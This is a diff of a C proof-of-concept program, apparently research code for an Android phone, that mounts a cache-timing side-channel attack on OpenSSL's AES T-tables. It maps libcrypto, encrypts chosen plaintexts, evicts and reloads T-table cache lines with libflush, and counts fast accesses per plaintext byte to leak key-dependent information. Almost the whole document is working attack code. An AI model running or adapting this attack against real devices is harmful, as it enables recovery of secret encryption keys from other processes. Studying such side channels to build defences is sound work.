@@ -15,40 +15,29 @@
 #include <time.h>
 #include <libflush/libflush.h>
 
-//#include <asm/cacheflush.h>
-//#include "cacheutils.h"
-//#include <map>
-//#include <vector>
-//#include <iostream>
-// this number varies on different systems
-#define MIN_CACHE_MISS_CYCLES (110)
-#define THRESHOLD (270)
-#define CPU 2
 
-
+#define NUMBER_OF_ENCRYPTIONS (600)
 // more encryptions show features more clearly
-#define NUMBER_OF_ENCRYPTIONS (350)
 #define NUMBER_OF_ENCRYPTIONS2 (12000)
 #define MAP_SIZE 4096
+// this number varies on different systems
+#define MIN_CACHE_MISS_CYCLES (110)
+#define THRESHOLD (250)
+#define CPU 0
+
+struct cache_map{
+	char * map_element;
+	size_t entry;
+	size_t byte_entry;
+};
+
+
 
 static inline uint32_t get_cycle_count(void);
 static inline void dcache_clean(void);
-static inline void flush(void *addr);
+static inline void flush(void );
 void setCurrentThreadAffinityMask(cpu_set_t mask);
 
-void setCurrentThreadAffinityMask(cpu_set_t mask)
-{
-    int err, syscallres;
-    pid_t pid = getpid();
-    printf("The process id is %zu\n",getpid()); 
-    syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(mask), &mask);
-    if (syscallres)
-    {
-        err = errno;
-        printf("Error no is %d",err);
-       // LOGE("Error in the syscall setaffinity: mask=%d=0x%x err=%d=0x%x", mask, mask, err, err);
-    }
-}
 
 
 unsigned char key[] =
@@ -61,20 +50,17 @@ unsigned char key[] =
 
 size_t sum;
 size_t scount;
-
-//std::map<char*, std::map<size_t, size_t> > timings;
-//std::map<size_t,size_t > timings_delta;
+struct cache_map timings[128];
 char* base;
 char* probe;
 char* end;
 unsigned char* tmp;
 unsigned char* tmp_end;
 
+
 int main()
 {
-   
-  //unsigned char array[4096]={0};
- // int *address = &array[4096]; 
+
   int fd = open("/data/local/tmp/crypto/libcrypto.so.1.0.0", O_RDONLY);
   size_t size = lseek(fd, 0, SEEK_END);
   if (size == 0)
@@ -87,21 +73,13 @@ int main()
   }
   base = (char*) mmap(0, map_size, PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
   end = base + size;
-  getchar();
+ // getchar();
   //tmp = base + 0x14f45c;
  // tmp_end = tmp + 0x1000;
   //volatile unsigned int *p = (volatile unsigned int *)tmp;
-  printf("The begining value of tables are is %p\n",base);
+  printf("The address from where library is mapped : %p\n",base);
   int i =0;
- /*
-  for(i=0;i<4;i++) 
-     printf("%02x\n",*(tmp+3-i));
- */
- /*
-  printf("Printing from next table\n");   
-  for(i=0;i<4;i++) 
-    printf("%02x\n",*(tmp_end+3-i));
-   */
+//struct cache_map new_map[48];
  
      
   unsigned char plaintext[] =
@@ -114,11 +92,9 @@ int main()
   
   
   libflush_session_t* libflush_session;
-  
- 
-
   AES_KEY key_struct;
   AES_set_encrypt_key(key, 128, &key_struct);
+  
   struct timespec time = {0,0};
   struct timespec time_seed = {0,0};
   struct timespec time2 ={0,0};
@@ -127,8 +103,10 @@ int main()
   clock_gettime(CLOCK_MONOTONIC, &time_seed);
   double measured_time = ((double)time.tv_sec + 1.0e-9*time.tv_nsec);
   srand(measured_time);
+  
   libflush_init(&libflush_session, NULL);
   size_t sets = libflush_get_number_of_sets(libflush_session);
+  /*Counting the number of active cpus on my system */
   size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
   printf("Number of active cpus %zu\n",number_of_cpus);
   cpu_set_t mask;
@@ -145,18 +123,24 @@ int main()
       else{
 		  printf("<1>The affinity has been set..\n");
 	  }
-  //getchar();
+ 
   printf("The number of sets in Nexus 5 are %zu\n", sets);
   int flag =0;
+  size_t counter=0;
+ 
   for (size_t byte = 0; byte < 256; byte += 16)
     {
      plaintext[0]=byte;
-     
      size_t set_index;
+    
+     printf("The 0th byte of plaintext has been set to %zu\n",plaintext[0]);
      AES_encrypt(plaintext, ciphertext, &key_struct);
+   //  getchar();
+     
 /* Probing the T-table elements*/
-  for (probe =(base + 0x14f45c); probe < (base + 0x15045c); probe += 64) // 16    
+  for (probe =(base + 0x14f45c); probe < (base + 0x14f65c); probe += 64) // 64: Cache-line size    
       {	
+	  int j=0;
 	  set_index=libflush_get_set_index(libflush_session,probe);		
 	  printf("\nThe value of probe's set index is %zu\n",set_index);
 	  volatile unsigned int *p = (volatile unsigned int *)probe;
@@ -166,70 +150,97 @@ int main()
        size_t count = 0;
        size_t delta_sum = 0;
        size_t delta =0;
+       
        usleep(1);
        for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
         {  
-        for (size_t j = 1; j < 16; ++j)
-			plaintext[j] = rand() % 256;
-		
-        AES_encrypt(plaintext,ciphertext,&key_struct);
-		clock_gettime(CLOCK_MONOTONIC, &time);
-        libflush_access_memory(probe);
-        clock_gettime(CLOCK_MONOTONIC, &time2);
-        //libflush_evict(libflush_session,probe);
-        flush(probe);
-        //getchar();
-       // dcache_clean();
-        //AES_encrypt(plaintext,ciphertext,&key_struct);
-       // usleep(1);
-        //sched_yield();
+          for (size_t j = 1; j < 16; ++j)
+             {
+			   plaintext[j] = rand() % 256;}
+		/*1st encryption round  */
+       AES_encrypt(plaintext,ciphertext,&key_struct);
+		/* 2nd Encryption round */
+	   //size_t timer1 = get_cycle_count();
+	   clock_gettime(CLOCK_MONOTONIC, &time);
+       AES_encrypt(plaintext,ciphertext,&key_struct);
+       clock_gettime(CLOCK_MONOTONIC, &time2);
+       //size_t timer2 = get_cycle_count();
+        /*Evicting an address*/
+        size_t time_evict = libflush_reload_address_and_evict(libflush_session,probe);
+       /*3rd encryption round*/
         clock_gettime(CLOCK_MONOTONIC, &time3);
-        libflush_access_memory(probe);
+        //size_t timer3 = get_cycle_count();
+        AES_encrypt(plaintext,ciphertext,&key_struct);
+        // size_t timer4 = get_cycle_count();
         clock_gettime(CLOCK_MONOTONIC, &time4);
-       // size_t probe_timer_start = libflush_reload_address(libflush_session, tmp);
-        size_t delta_aes2 = time4.tv_nsec-time3.tv_nsec ; 
-        //delta = (timer3-timer2)-delta_aes2;
-        if (delta_aes2 > THRESHOLD)
+        size_t probe_timer_start = libflush_reload_address(libflush_session, probe);
+       // size_t delta_aes2 = (timer4-timer3)-(timer2-timer1); 
+       size_t delta_aes2 = (time4.tv_nsec-time3.tv_nsec)-(time2.tv_nsec-time.tv_nsec); 
+        if (probe_timer_start < THRESHOLD)
           ++count;
-	   fprintf(stdout, "\n Timings for accessing probe at %p  for first time is %ld \n",probe,(time2.tv_nsec-time.tv_nsec));
-	    fprintf(stdout, "\n Timings for accessing evicted address\t at %p is %ld \n",probe,(time4.tv_nsec-time3.tv_nsec));
-	//    printf("Time to access data first time at %p:%zu\n",tmp, probe_timer_start1);
-	//	printf("Time to access evicted data at %p:%"PRIu32"\n",tmp,probe_timer_start);
-		//fprintf(stdout, "Time-difference between 2nd & 3rd AES\t %zu\n",delta);
+	   fprintf(stdout, "\n Timings for AES at first time at %p is %ld \n",probe,(time2.tv_nsec-time.tv_nsec));
+	   fprintf(stdout, "\n Timings for AES at  second time %p is %ld \n",probe,(time4.tv_nsec-time3.tv_nsec));
+	  	 //fprintf(stdout, "\n Timings for AES at  first time %p is %zu \n",probe,(timer2-timer1));
+	     //fprintf(stdout, "\n Timings for AES at  second time %p is %zu \n",probe,(timer4-timer3));
+	   // 
+	      printf("\nTime to access data first time at %p:%zu\n",probe, time_evict);
+          printf("\nTime to access evicted data at %p:%zu\n",probe, probe_timer_start);
+		  printf("\nTime-difference between 2nd & 3rd AES\t %zu\n",delta_aes2);
 		}
-		fprintf(stdout, "\n Address:%p \t Byte:%zu \t Count:%zu\n",probe,byte,count);
 		
-      // fprintf(stdout,"%zu\t%zu\n",byte,delta_);
-     // timings_delta[byte]=delta_sum;
-    //  timings[probe][byte] = count;
-    }
-    printf("Flag : %d\n\n\n\n\n\n\n\n",flag);
-  //  getchar();
+		fprintf(stdout, "\n Address:%p \t Byte:%zu \t Count:%zu\n",probe,byte,count);
+		printf("Flag : %d\n\n\n\n\n\n\n\n",flag);
+		timings[flag].entry=count;
+		timings[flag].map_element=probe;
+		timings[flag].byte_entry =byte;
         flag++;
-    
+		// timings[counter].entry = count;
+	//	 timings[counter].map_element=probe;
+		// counter=counter+16;
+    } 
   }
   
-/*printf("\n\n\n\n**********\n\n\n\n");
-printf("\nPrinting the values of timings w.r.t the probe address and plain-text bytes\n");*/
-/*
-  for (auto ait : timings)
+ for(i=0;i<128;i++)
   {
-    printf("%p:\t", (void*) (ait.first - base));
-    for (auto kit : ait.second)
-    {adv
-      printf("%6lu,", kit.second);
-    }
-    printf("\n");
-  }
+  printf("%zu:\t%p\t%zu\t\n",timings[i].byte_entry,timings[i].map_element,timings[i].entry);
+}
+printf("\n");
+int num=0;
+for(num=0;num<128;num++)
+{  
+	if((num%8)==0)
+    	{printf("\n");
+    	}
+	else
+	   {
+		    printf("%zu \t",timings[num].entry);}
+}
 
-*/
+printf("\n");
+
    /* Terminate libflush */
   libflush_terminate(libflush_session);
+  
   close(fd);
   munmap(base, map_size);
   fflush(stdout);
-  getchar();
+ // getchar();
   return 0;
+}
+
+
+void setCurrentThreadAffinityMask(cpu_set_t mask)
+{
+    int err, syscallres;
+    pid_t pid = getpid();
+    printf("The process id is %zu\n",getpid()); 
+    syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(mask), &mask);
+    if (syscallres)
+    {
+        err = errno;
+        printf("Error no is %d",err);
+       // LOGE("Error in the syscall setaffinity: mask=%d=0x%x err=%d=0x%x", mask, mask, err, err);
+    }
 }
 
 static inline size_t get_cycle_count(void)
@@ -238,9 +249,11 @@ static inline size_t get_cycle_count(void)
          __asm__ volatile("mrc p15, 0, %0, c9, c13, 0" : "=r"(r) );
         return r;
 }
- static inline void flush(void *addr)
+ static inline void flush(void)
  {
-     __asm__ __volatile__("mcr p15, 0, %0, c7, c6, 1"::"r"(addr));                                              
+     //__asm__ __volatile__("mcr p15, 0, %0, c7, c6, 1"::"r"(addr)); 
+     __asm__ __volatile__("mcr p15, 0, r1, c7, c10, 3":); 
+                                                
  } 
 static inline void dcache_clean(void)
  {
